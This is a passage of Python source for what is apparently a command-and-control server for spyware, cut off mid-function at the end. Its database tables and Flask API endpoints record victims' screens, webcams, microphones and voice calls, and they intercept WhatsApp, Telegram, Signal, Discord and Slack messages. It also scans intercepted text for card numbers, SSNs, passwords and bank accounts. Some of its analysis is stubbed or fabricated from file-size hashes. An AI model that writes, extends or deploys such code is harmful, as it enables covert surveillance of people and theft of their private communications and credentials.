                victim_id, 'screenshot', data['file_path'], data['file_size'],
                data['resolution'], data['format'], data['thumbnail_path'],
                data['metadata']
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            log_activity(f"❌ Error storing screen recording: {e}")
    
    def store_camera_capture(self, victim_id, data):
        """Store camera capture data"""
        try:
            conn = sqlite3.connect(DATABASE)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO camera_captures 
                (victim_id, capture_type, file_path, file_size, resolution,
                 camera_info, face_detected, face_count, metadata)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                victim_id, 'photo', data['file_path'], data['file_size'],
                data['resolution'], data['camera_info'], data['face_detected'],
                data['face_count'], data['metadata']
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            log_activity(f"❌ Error storing camera capture: {e}")
    
    def store_audio_recording(self, victim_id, data):
        """Store audio recording data"""
        try:
            conn = sqlite3.connect(DATABASE)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO audio_recordings 
                (victim_id, recording_type, file_path, file_size, duration,
                 sample_rate, channels, format, voice_detected, transcription, metadata)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                victim_id, 'recording', data['file_path'], data['file_size'],
                data['duration'], data['sample_rate'], data['channels'],
                data['format'], data['voice_detected'], data['transcription'],
                data['metadata']
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            log_activity(f"❌ Error storing audio recording: {e}")
    
    async def stop_monitoring_session(self, session_id):
        """Stop a monitoring session"""
        try:
            if session_id in self.active_sessions:
                session = self.active_sessions[session_id]
                session['status'] = 'stopped'
                session['end_time'] = datetime.now()
                
                # Update database
                conn = sqlite3.connect(DATABASE)
                cursor = conn.cursor()
                
                cursor.execute('''
                    UPDATE monitoring_sessions 
                    SET status = ?, end_time = ?, total_captures = ?
                    WHERE victim_id = ? AND session_type = ?
                ''', (
                    'stopped', datetime.now(), session['captures'],
                    session['victim_id'], session['type']
                ))
                
                conn.commit()
                conn.close()
                
                del self.active_sessions[session_id]
                
                log_activity(f"🛑 Monitoring session {session_id} stopped")
                
                return {'status': 'stopped', 'session_id': session_id}
            else:
                return {'error': 'Session not found'}
                
        except Exception as e:
            log_activity(f"❌ Error stopping monitoring session: {e}")
            return {'error': str(e)}
    
    def get_session_status(self, session_id):
        """Get status of monitoring session"""
        if session_id in self.active_sessions:
            return self.active_sessions[session_id]
        return {'error': 'Session not found'}
    
    def list_active_sessions(self, victim_id=None):
        """List active monitoring sessions"""
        if victim_id:
            return {sid: session for sid, session in self.active_sessions.items() 
                   if session['victim_id'] == victim_id}
        return self.active_sessions

# API endpoints for media monitoring
@app.route('/api/start-screen-recording/<victim_id>', methods=['POST'])
def api_start_screen_recording(victim_id):
    """Start screen recording for victim"""
    try:
        config = request.get_json() or {}
        
        media_monitor = MediaMonitoring()
        
        # Start screen recording
        def run_screen_recording():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop.run_until_complete(
                media_monitor.start_screen_recording(victim_id, config)
            )
        
        executor = ThreadPoolExecutor(max_workers=1)
        future = executor.submit(run_screen_recording)
        result = future.result(timeout=30)
        
        return jsonify(result)
        
    except Exception as e:
        log_activity(f"❌ Error starting screen recording: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/start-camera-monitoring/<victim_id>', methods=['POST'])
def api_start_camera_monitoring(victim_id):
    """Start camera monitoring for victim"""
    try:
        config = request.get_json() or {}
        
        media_monitor = MediaMonitoring()
        
        def run_camera_monitoring():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop.run_until_complete(
                media_monitor.start_camera_monitoring(victim_id, config)
            )
        
        executor = ThreadPoolExecutor(max_workers=1)
        future = executor.submit(run_camera_monitoring)
        result = future.result(timeout=30)
        
        return jsonify(result)
        
    except Exception as e:
        log_activity(f"❌ Error starting camera monitoring: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/start-audio-recording/<victim_id>', methods=['POST'])
def api_start_audio_recording(victim_id):
    """Start audio recording for victim"""
    try:
        config = request.get_json() or {}
        
        media_monitor = MediaMonitoring()
        
        def run_audio_recording():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop.run_until_complete(
                media_monitor.start_audio_recording(victim_id, config)
            )
        
        executor = ThreadPoolExecutor(max_workers=1)
        future = executor.submit(run_audio_recording)
        result = future.result(timeout=30)
        
        return jsonify(result)
        
    except Exception as e:
        log_activity(f"❌ Error starting audio recording: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/process-screen-capture/<victim_id>', methods=['POST'])
def api_process_screen_capture(victim_id):
    """Process received screen capture"""
    try:
        capture_data = request.get_json()
        
        media_monitor = MediaMonitoring()
        
        def process_capture():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop.run_until_complete(
                media_monitor.process_screen_capture(victim_id, capture_data)
            )
        
        executor = ThreadPoolExecutor(max_workers=1)
        future = executor.submit(process_capture)
        result = future.result(timeout=60)
        
        return jsonify(result)
        
    except Exception as e:
        log_activity(f"❌ Error processing screen capture: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/process-camera-capture/<victim_id>', methods=['POST'])
def api_process_camera_capture(victim_id):
    """Process received camera capture"""
    try:
        capture_data = request.get_json()
        
        media_monitor = MediaMonitoring()
        
        def process_capture():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop.run_until_complete(
                media_monitor.process_camera_capture(victim_id, capture_data)
            )
        
        executor = ThreadPoolExecutor(max_workers=1)
        future = executor.submit(process_capture)
        result = future.result(timeout=60)
        
        return jsonify(result)
        
    except Exception as e:
        log_activity(f"❌ Error processing camera capture: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/process-audio-recording/<victim_id>', methods=['POST'])
def api_process_audio_recording(victim_id):
    """Process received audio recording"""
    try:
        audio_data = request.get_json()
        
        media_monitor = MediaMonitoring()
        
        def process_audio():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop.run_until_complete(
                media_monitor.process_audio_recording(victim_id, audio_data)
            )
        
        executor = ThreadPoolExecutor(max_workers=1)
        future = executor.submit(process_audio)
        result = future.result(timeout=120)
        
        return jsonify(result)
        
    except Exception as e:
        log_activity(f"❌ Error processing audio recording: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/media-captures/<victim_id>')
def api_get_media_captures(victim_id):
    """Get all media captures for a victim"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Get screen recordings
        cursor.execute('''
            SELECT * FROM screen_recordings 
            WHERE victim_id = ? 
            ORDER BY timestamp DESC
        ''', (victim_id,))
        screen_recordings = cursor.fetchall()
        
        # Get camera captures
        cursor.execute('''
            SELECT * FROM camera_captures 
            WHERE victim_id = ? 
            ORDER BY timestamp DESC
        ''', (victim_id,))
        camera_captures = cursor.fetchall()
        
        # Get audio recordings
        cursor.execute('''
            SELECT * FROM audio_recordings 
            WHERE victim_id = ? 
            ORDER BY timestamp DESC
        ''', (victim_id,))
        audio_recordings = cursor.fetchall()
        
        conn.close()
        
        return jsonify({
            'victim_id': victim_id,
            'screen_recordings': [dict(zip([col[0] for col in cursor.description], row)) for row in screen_recordings],
            'camera_captures': [dict(zip([col[0] for col in cursor.description], row)) for row in camera_captures],
            'audio_recordings': [dict(zip([col[0] for col in cursor.description], row)) for row in audio_recordings]
        })
        
    except Exception as e:
        log_activity(f"❌ Error getting media captures: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/stop-monitoring/<session_id>', methods=['POST'])
def api_stop_monitoring(session_id):
    """Stop monitoring session"""
    try:
        media_monitor = MediaMonitoring()
        
        def stop_session():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop.run_until_complete(
                media_monitor.stop_monitoring_session(session_id)
            )
        
        executor = ThreadPoolExecutor(max_workers=1)
        future = executor.submit(stop_session)
        result = future.result(timeout=30)
        
        return jsonify(result)
        
    except Exception as e:
        log_activity(f"❌ Error stopping monitoring: {e}")
        return jsonify({'error': str(e)}), 500
    
    # Part 4: Advanced Keylogger with OCR
# Add these to your existing c2_server.py

# Part 5: Instant Message Capture & Voice Recording
# Add these to your existing c2_server.py



# Enhanced database schema for Part 5
def init_enhanced_db_part5():
    """Enhanced database schema for messaging and voice recording"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Instant messages table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS instant_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                platform TEXT,
                chat_id TEXT,
                message_id TEXT,
                sender TEXT,
                recipient TEXT,
                message_content TEXT,
                message_type TEXT,
                media_attachments TEXT,
                timestamp_sent TIMESTAMP,
                timestamp_received TIMESTAMP,
                is_encrypted BOOLEAN,
                group_chat BOOLEAN,
                group_members TEXT,
                metadata TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Voice calls table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS voice_calls (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                call_id TEXT,
                platform TEXT,
                call_type TEXT,
                participants TEXT,
                duration INTEGER,
                recording_path TEXT,
                transcription TEXT,
                voice_analysis TEXT,
                call_quality TEXT,
                start_time TIMESTAMP,
                end_time TIMESTAMP,
                metadata TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Voice transcriptions table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS voice_transcriptions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                audio_source TEXT,
                transcription_text TEXT,
                confidence_score REAL,
                language_detected TEXT,
                speaker_identification TEXT,
                sentiment_analysis TEXT,
                keywords_extracted TEXT,
                audio_file_path TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Communication patterns table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS communication_patterns (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                pattern_type TEXT,
                contact_frequency TEXT,
                most_contacted TEXT,
                communication_times TEXT,
                platforms_used TEXT,
                behavioral_indicators TEXT,
                risk_assessment TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
        log_activity("✅ Enhanced messaging database schema initialized")
        return True
        
    except Exception as e:
        log_activity(f"❌ Messaging database initialization failed: {e}")
        return False

class MessageInterceptor:
    """Advanced instant message and voice communication interceptor"""
    
    def __init__(self):
        self.active_monitoring = {}
        self.message_buffer = defaultdict(list)
        self.voice_sessions = {}
        
        # Platform-specific configurations
        self.platform_configs = {
            'whatsapp': {
                'selectors': {
                    'message_container': '[data-testid="conversation-panel"]',
                    'message_text': '._2FVVk span',
                    'sender': '._3DFk6',
                    'timestamp': '._3EFt_'
                },
                'indicators': ['whatsapp.com', 'web.whatsapp.com']
            },
            'telegram': {
                'selectors': {
                    'message_container': '.im_history_messages_peer',
                    'message_text': '.im_message_text',
                    'sender': '.im_message_author',
                    'timestamp': '.im_message_date'
                },
                'indicators': ['telegram.org', 'web.telegram.org']
            },
            'signal': {
                'selectors': {
                    'message_container': '.conversation-view',
                    'message_text': '.message-body',
                    'sender': '.contact-name',
                    'timestamp': '.timestamp'
                },
                'indicators': ['signal.org']
            },
            'discord': {
                'selectors': {
                    'message_container': '[data-list-id="chat-messages"]',
                    'message_text': '[id^="message-content-"]',
                    'sender': '.username',
                    'timestamp': '.timestamp'
                },
                'indicators': ['discord.com', 'discordapp.com']
            },
            'slack': {
                'selectors': {
                    'message_container': '.c-virtual_list__scroll_container',
                    'message_text': '.c-message_kit__text',
                    'sender': '.c-message__sender',
                    'timestamp': '.c-timestamp'
                },
                'indicators': ['slack.com']
            }
        }
    
    async def start_message_monitoring(self, victim_id, config=None):
        """Start instant message monitoring"""
        try:
            session_id = f"msg_{victim_id}_{int(time.time())}"
            
            monitoring_config = {
                'platforms': config.get('platforms', ['whatsapp', 'telegram', 'signal']) if config else ['whatsapp', 'telegram', 'signal'],
                'capture_images': config.get('capture_images', True) if config else True,
                'capture_voice_messages': config.get('capture_voice_messages', True) if config else True,
                'real_time_monitoring': config.get('real_time_monitoring', True) if config else True,
                'sentiment_analysis': config.get('sentiment_analysis', False) if config else False,
                'keyword_alerts': config.get('keyword_alerts', []) if config else [],
                'duration': config.get('duration', 3600) if config else 3600  # 1 hour default
            }
            
            self.active_monitoring[session_id] = {
                'victim_id': victim_id,
                'config': monitoring_config,
                'start_time': datetime.now(),
                'messages_captured': 0,
                'platforms_detected': set()
            }
            
            log_activity(f"💬 Message monitoring started for victim {victim_id[:12]}")
            
            return {
                'session_id': session_id,
                'status': 'started',
                'config': monitoring_config
            }
            
        except Exception as e:
            log_activity(f"❌ Message monitoring start error: {e}")
            return {'error': str(e)}
    
    async def process_intercepted_message(self, victim_id, message_data):
        """Process intercepted instant message"""
        try:
            # Extract message information
            platform = self.detect_platform(message_data.get('page_url', ''))
            message_content = message_data.get('content', '')
            sender = message_data.get('sender', '')
            recipient = message_data.get('recipient', '')
            timestamp = message_data.get('timestamp', datetime.now())
            
            # Analyze message content
            content_analysis = await self.analyze_message_content(message_content)
            
            # Check for sensitive information
            sensitive_data = self.detect_sensitive_message_content(message_content)
            
            # Store message
            self.store_instant_message(victim_id, {
                'platform': platform,
                'chat_id': message_data.get('chat_id', ''),
                'message_id': message_data.get('message_id', ''),
                'sender': sender,
                'recipient': recipient,
                'message_content': message_content,
                'message_type': message_data.get('type', 'text'),
                'media_attachments': json.dumps(message_data.get('attachments', [])),
                'timestamp_sent': timestamp,
                'timestamp_received': datetime.now(),
                'is_encrypted': message_data.get('encrypted', False),
                'group_chat': message_data.get('is_group', False),
                'group_members': json.dumps(message_data.get('group_members', [])),
                'metadata': json.dumps({
                    'content_analysis': content_analysis,
                    'sensitive_data': sensitive_data,
                    'page_info': message_data.get('page_info', {})
                })
            })
            
            # Update message buffer for pattern analysis
            self.message_buffer[victim_id].append({
                'platform': platform,
                'sender': sender,
                'content_length': len(message_content),
                'timestamp': datetime.now(),
                'sensitive': len(sensitive_data) > 0
            })
            
            # Trigger alerts if keywords detected
            alerts = await self.check_keyword_alerts(victim_id, message_content)
            
            log_activity(f"💬 Message intercepted for victim {victim_id[:12]} on {platform} (Sensitive: {len(sensitive_data) > 0})")
            
            return {
                'status': 'processed',
                'platform': platform,
                'sensitive_data_found': len(sensitive_data) > 0,
                'alerts_triggered': len(alerts),
                'content_analysis': content_analysis
            }
            
        except Exception as e:
            log_activity(f"❌ Message interception error: {e}")
            return {'error': str(e)}
    
    async def start_voice_call_recording(self, victim_id, call_data):
        """Start voice call recording"""
        try:
            call_id = f"call_{victim_id}_{int(time.time())}"
            
            call_info = {
                'call_id': call_id,
                'victim_id': victim_id,
                'platform': call_data.get('platform', 'unknown'),
                'call_type': call_data.get('type', 'voice'),  # voice, video, conference
                'participants': call_data.get('participants', []),
                'start_time': datetime.now(),
                'recording_active': True,
                'audio_chunks': [],
                'transcription_buffer': []
            }
            
            self.voice_sessions[call_id] = call_info
            
            log_activity(f"📞 Voice call recording started for victim {victim_id[:12]}")
            
            return {
                'call_id': call_id,
                'status': 'recording_started',
                'recording_config': {
                    'sample_rate': 44100,
                    'channels': 2,
                    'format': 'wav'
                }
            }
            
        except Exception as e:
            log_activity(f"❌ Voice call recording start error: {e}")
            return {'error': str(e)}
    
    async def process_voice_chunk(self, call_id, audio_chunk_data):
        """Process voice call audio chunk"""
        try:
            if call_id not in self.voice_sessions:
                return {'error': 'Call session not found'}
            
            session = self.voice_sessions[call_id]
            
            # Decode audio chunk
            audio_bytes = base64.b64decode(audio_chunk_data['audio_data'])
            
            # Add to session buffer
            session['audio_chunks'].append({
                'data': audio_bytes,
                'timestamp': datetime.now(),
                'sequence': audio_chunk_data.get('sequence', 0)
            })
            
            # Perform real-time transcription if enabled
            if len(session['audio_chunks']) % 10 == 0:  # Every 10 chunks
                transcription = await self.transcribe_audio_chunk(audio_bytes)
                if transcription:
                    session['transcription_buffer'].append(transcription)
            
            return {'status': 'chunk_processed', 'buffer_size': len(session['audio_chunks'])}
            
        except Exception as e:
            log_activity(f"❌ Voice chunk processing error: {e}")
            return {'error': str(e)}
    
    async def end_voice_call_recording(self, call_id):
        """End voice call recording and process"""
        try:
            if call_id not in self.voice_sessions:
                return {'error': 'Call session not found'}
            
            session = self.voice_sessions[call_id]
            session['end_time'] = datetime.now()
            session['recording_active'] = False
            
            # Combine audio chunks
            combined_audio = await self.combine_audio_chunks(session['audio_chunks'])
            
            # Save recording
            recording_path = await self.save_voice_recording(call_id, combined_audio)
            
            # Full transcription
            full_transcription = await self.transcribe_full_recording(recording_path)
            
            # Voice analysis
            voice_analysis = await self.analyze_voice_characteristics(recording_path)
            
            # Store call data
            self.store_voice_call(session['victim_id'], {
                'call_id': call_id,
                'platform': session['platform'],
                'call_type': session['call_type'],
                'participants': json.dumps(session['participants']),
                'duration': int((session['end_time'] - session['start_time']).total_seconds()),
                'recording_path': recording_path,
                'transcription': full_transcription['text'],
                'voice_analysis': json.dumps(voice_analysis),
                'call_quality': voice_analysis.get('quality_score', 'unknown'),
                'start_time': session['start_time'],
                'end_time': session['end_time'],
                'metadata': json.dumps({
                    'chunks_processed': len(session['audio_chunks']),
                    'transcription_confidence': full_transcription.get('confidence', 0.0),
                    'language_detected': full_transcription.get('language', 'unknown')
                })
            })
            
            # Clean up session
            del self.voice_sessions[call_id]
            
            log_activity(f"📞 Voice call recording completed: {call_id}")
            
            return {
                'status': 'recording_completed',
                'call_id': call_id,
                'duration': int((session['end_time'] - session['start_time']).total_seconds()),
                'transcription_available': len(full_transcription['text']) > 0,
                'voice_analysis': voice_analysis
            }
            
        except Exception as e:
            log_activity(f"❌ Voice call recording end error: {e}")
            return {'error': str(e)}
    
    def detect_platform(self, page_url):
        """Detect messaging platform from URL"""
        if not page_url:
            return 'unknown'
        
        page_url = page_url.lower()
        
        for platform, config in self.platform_configs.items():
            if any(indicator in page_url for indicator in config['indicators']):
                return platform
        
        return 'unknown'
    
    async def analyze_message_content(self, content):
        """Analyze message content characteristics"""
        analysis = {
            'word_count': len(content.split()),
            'char_count': len(content),
            'contains_urls': bool(re.search(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', content)),
            'contains_email': bool(re.search(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', content)),
            'contains_phone': bool(re.search(r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b', content)),
            'language_detected': 'en',  # Simplified
            'sentiment': 'neutral',  # Simplified
            'urgency_indicators': [],
            'emoji_count': len(re.findall(r'[\U0001F600-\U0001F64F\U0001F300-\U0001F5FF\U0001F680-\U0001F6FF\U0001F1E0-\U0001F1FF]', content))
        }
        
        # Check for urgency indicators
        urgency_keywords = ['urgent', 'asap', 'emergency', 'now', 'immediately', 'help']
        analysis['urgency_indicators'] = [word for word in urgency_keywords if word.lower() in content.lower()]
        
        return analysis
    
    def detect_sensitive_message_content(self, content):
        """Detect sensitive information in message content"""
        sensitive_data = []
        
        # Use patterns from keylogger
        sensitive_patterns = {
            'credit_card': r'\b(?:\d{4}[-\s]?){3}\d{4}\b',
            'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
            'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            'phone': r'\b\d{3}-\d{3}-\d{4}\b|\(\d{3}\)\s?\d{3}-\d{4}',
            'password': r'(?i)(password|pass|pwd|secret|key)\s*[:=]\s*\S+',
            'bank_account': r'\b\d{8,17}\b',
            'address': r'\d+\s+[A-Za-z\s]+(?:Street|St|Avenue|Ave|Road|Rd|Drive|Dr|Lane|Ln|Boulevard|Blvd)',
            'ip_address': r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
        }
        
        for pattern_name, pattern in sensitive_patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                sensitive_data.append({
                    'type': pattern_name,
                    'matches': matches,
                    'count': len(matches)
                })
        
        return sensitive_data
    
    async def check_keyword_alerts(self, victim_id, content):
        """Check for keyword alerts in message content"""
        alerts = []
        
        # Get monitoring session for this victim
        victim_session = None
        for session_id, session in self.active_monitoring.items():
            if session['victim_id'] == victim_id:
                victim_session = session
                break
        
        if not victim_session:
            return alerts
        
        keyword_alerts = victim_session['config'].get('keyword_alerts', [])
        
        for keyword in keyword_alerts:
            if keyword.lower() in content.lower():
                alerts.append({
                    'keyword': keyword,
                    'context': self.extract_context(content, keyword),
                    'timestamp': datetime.now()
                })
        
        return alerts
    
    def extract_context(self, content, keyword, context_length=50):
        """Extract context around a keyword"""
        keyword_pos = content.lower().find(keyword.lower())
        if keyword_pos == -1:
            return content[:100]  # Fallback
        
        start = max(0, keyword_pos - context_length)
        end = min(len(content), keyword_pos + len(keyword) + context_length)
        
        return content[start:end]
    
    async def combine_audio_chunks(self, audio_chunks):
        """Combine audio chunks into single audio stream"""
        try:
            # Sort chunks by sequence/timestamp
            sorted_chunks = sorted(audio_chunks, key=lambda x: x.get('sequence', x['timestamp']))
            
            # Combine audio data
            combined_audio = b''
            for chunk in sorted_chunks:
                combined_audio += chunk['data']
            
            return combined_audio
            
        except Exception as e:
            log_activity(f"❌ Audio combination error: {e}")
            return b''
    
    async def save_voice_recording(self, call_id, audio_data):
        """Save voice recording to file"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"voice_call_{call_id}_{timestamp}.wav"
            file_path = os.path.join('media_captures', 'voice_calls', filename)
            
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            with open(file_path, 'wb') as f:
                f.write(audio_data)
            
            return file_path
            
        except Exception as e:
            log_activity(f"❌ Voice recording save error: {e}")
            return None
    
    async def transcribe_audio_chunk(self, audio_bytes):
        """Transcribe audio chunk in real-time"""
        try:
            # Simplified transcription - in production use Whisper or cloud APIs
            # This is a placeholder implementation
            if len(audio_bytes) > 1000:  # Minimum audio size
                return {
                    'text': '[Real-time transcription would appear here]',
                    'confidence': 0.8,
                    'timestamp': datetime.now()
                }
            return None
            
        except Exception as e:
            log_activity(f"❌ Real-time transcription error: {e}")
            return None
    
    async def transcribe_full_recording(self, recording_path):
        """Transcribe full voice recording"""
        try:
            if not recording_path or not os.path.exists(recording_path):
                return {'text': '', 'confidence': 0.0, 'language': 'unknown'}
            
            # Simplified transcription - in production use Whisper or speech recognition APIs
            transcription = {
                'text': '[Full transcription of voice call would appear here]',
                'confidence': 0.85,
                'language': 'en',
                'segments': [
                    {
                        'start': 0.0,
                        'end': 10.0,
                        'text': '[Transcribed speech segment]',
                        'speaker': 'Speaker_1'
                    }
                ]
            }
            
            return transcription
            
        except Exception as e:
            log_activity(f"❌ Full transcription error: {e}")
            return {'text': '', 'confidence': 0.0, 'language': 'unknown'}
    
    async def analyze_voice_characteristics(self, recording_path):
        """Analyze voice characteristics and call quality"""
        try:
            analysis = {
                'duration': 0.0,
                'average_volume': 0.0,
                'silence_percentage': 0.0,
                'speaker_count': 1,
                'quality_score': 'good',
                'background_noise': 'low',
                'voice_emotions': ['neutral'],
                'speech_rate': 'normal',
                'interruptions': 0
            }
            
            if recording_path and os.path.exists(recording_path):
                # Get file size as a proxy for duration
                file_size = os.path.getsize(recording_path)
                analysis['duration'] = file_size / 176400  # Rough estimate for 44.1kHz stereo
                
                # Simulate analysis based on file characteristics
                file_hash = hashlib.md5(str(file_size).encode()).hexdigest()
                hash_int = int(file_hash[:8], 16)
                
                analysis['average_volume'] = (hash_int % 100) / 100.0
                analysis['silence_percentage'] = ((hash_int >> 8) % 50) / 100.0
                analysis['speaker_count'] = 1 + ((hash_int >> 16) % 3)
                
                quality_scores = ['poor', 'fair', 'good', 'excellent']
                analysis['quality_score'] = quality_scores[(hash_int >> 24) % 4]
            
            return analysis
            
        except Exception as e:
            log_activity(f"❌ Voice analysis error: {e}")
            return {}
    
    async def analyze_communication_patterns(self, victim_id):
        """Analyze communication patterns for a victim"""
        try:
            # Get recent messages
            messages = self.message_buffer.get(victim_id, [])
            
            if not messages:
                return {}
            
            # Analyze patterns
            patterns = {
                'total_messages': len(messages),
                'platforms_used': list(set(msg['platform'] for msg in messages)),
                'most_active_hours': self.find_most_active_hours(messages),
                'average_response_time': self.calculate_average_response_time(messages),
                'most_contacted': self.find_most_contacted(messages),
                'message_frequency': self.calculate_message_frequency(messages),
                'sensitive_message_ratio': len([msg for msg in messages if msg['sensitive']]) / len(messages)
            }
            
            return patterns
            
        except Exception as e:
            log_activity(f"❌ Communication pattern analysis error: {e}")
            return {}
    
    def find_most_active_hours(self, messages):
        """Find most active communication hours"""
        hour_counts = defaultdict(int)
        
        for msg in messages:
            hour = msg['timestamp'].hour
            hour_counts[hour] += 1
        
        if hour_counts:
            most_active = max(hour_counts.items(), key=lambda x: x[1])
            return f"{most_active[0]:02d}:00"
        
        return "unknown"
    
    def calculate_average_response_time(self, messages):
        """Calculate average response time (simplified)"""
        # This would require more sophisticated conversation threading
        return "unknown"
    
    def find_most_contacted(self, messages):
        """Find most frequently contacted person"""
        sender_counts = defaultdict(int)
        
        for msg in messages:
            if msg.get('sender'):
                sender_counts[msg['sender']] += 1
        
        if sender_counts:
            most_contacted = max(sender_counts.items(), key=lambda x: x[1])
            return most_contacted[0]
        
        return "unknown"
    
    def calculate_message_frequency(self, messages):
        """Calculate message frequency over time"""
        if len(messages) < 2:
            return "insufficient_data"
        
        time_span = (messages[-1]['timestamp'] - messages[0]['timestamp']).total_seconds()
        messages_per_hour = (len(messages) / time_span) * 3600
        
        if messages_per_hour > 10:
            return "high"
        elif messages_per_hour > 3:
            return "medium"
        else:
            return "low"
    
    # Database storage methods
    def store_instant_message(self, victim_id, data):
        """Store instant message in database"""
        try:
            conn = sqlite3.connect(DATABASE)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO instant_messages 
                (victim_id, platform, chat_id, message_id, sender, recipient,
                 message_content, message_type, media_attachments, timestamp_sent,
                 timestamp_received, is_encrypted, group_chat, group_members, metadata)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                victim_id, data['platform'], data['chat_id'], data['message_id'],
                data['sender'], data['recipient'], data['message_content'],
                data['message_type'], data['media_attachments'], data['timestamp_sent'],
                data['timestamp_received'], data['is_encrypted'], data['group_chat'],
                data['group_members'], data['metadata']
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            log_activity(f"❌ Error storing instant message: {e}")
    
    def store_voice_call(self, victim_id, data):
        """Store voice call data in database"""
        try:
            conn = sqlite3.connect(DATABASE)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO voice_calls 
                (victim_id, call_id, platform, call_type, participants, duration,
                 recording_path, transcription, voice_analysis, call_quality,
                 start_time, end_time, metadata)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                victim_id, data['call_id'], data['platform'], data['call_type'],
                data['participants'], data['duration'], data['recording_path'],
                data['transcription'], data['voice_analysis'], data['call_quality'],
                data['start_time'], data['end_time'], data['metadata']
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            log_activity(f"❌ Error storing voice call: {e}")
    
    def store_voice_transcription(self, victim_id, data):
        """Store voice transcription data"""
        try:
            conn = sqlite3.connect(DATABASE)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO voice_transcriptions 
                (victim_id, audio_source, transcription_text, confidence_score,
                 language_detected, speaker_identification, sentiment_analysis,
                 keywords_extracted, audio_file_path)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                victim_id, data['audio_source'], data['transcription_text'],
                data['confidence_score'], data['language_detected'],
                data['speaker_identification'], data['sentiment_analysis'],
                data['keywords_extracted'], data['audio_file_path']
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            log_activity(f"❌ Error storing voice transcription: {e}")

# API endpoints for messaging and voice
@app.route('/api/start-message-monitoring/<victim_id>', methods=['POST'])
def api_start_message_monitoring(victim_id):
    """Start message monitoring for victim"""
    try:
        config = request.get_json() or {}
        
        interceptor = MessageInterceptor()
        
        def run_monitoring():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop.run_until_complete(
                interceptor.start_message_monitoring(victim_id, config)
            )
        
        executor = ThreadPoolExecutor(max_workers=1)
        future = executor.submit(run_monitoring)
        result = future.result(timeout=30)
        
        return jsonify(result)
        
    except Exception as e:
        log_activity(f"❌ Error starting message monitoring: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/process-message/<victim_id>', methods=['POST'])
def api_process_message(victim_id):
    """Process intercepted message"""
    try:
        message_data = request.get_json()
        
        interceptor = MessageInterceptor()
        
        def process_message():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop.run_until_complete(
                interceptor.process_intercepted_message(victim_id, message_data)
            )
        
        executor = ThreadPoolExecutor(max_workers=1)
        future = executor.submit(process_message)
        result = future.result(timeout=60)
        
        return jsonify(result)
        
    except Exception as e:
        log_activity(f"❌ Error processing message: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/start-voice-recording/<victim_id>', methods=['POST'])
def api_start_voice_recording(victim_id):
    """Start voice call recording"""
    try:
        call_data = request.get_json()
        
        interceptor = MessageInterceptor()
        
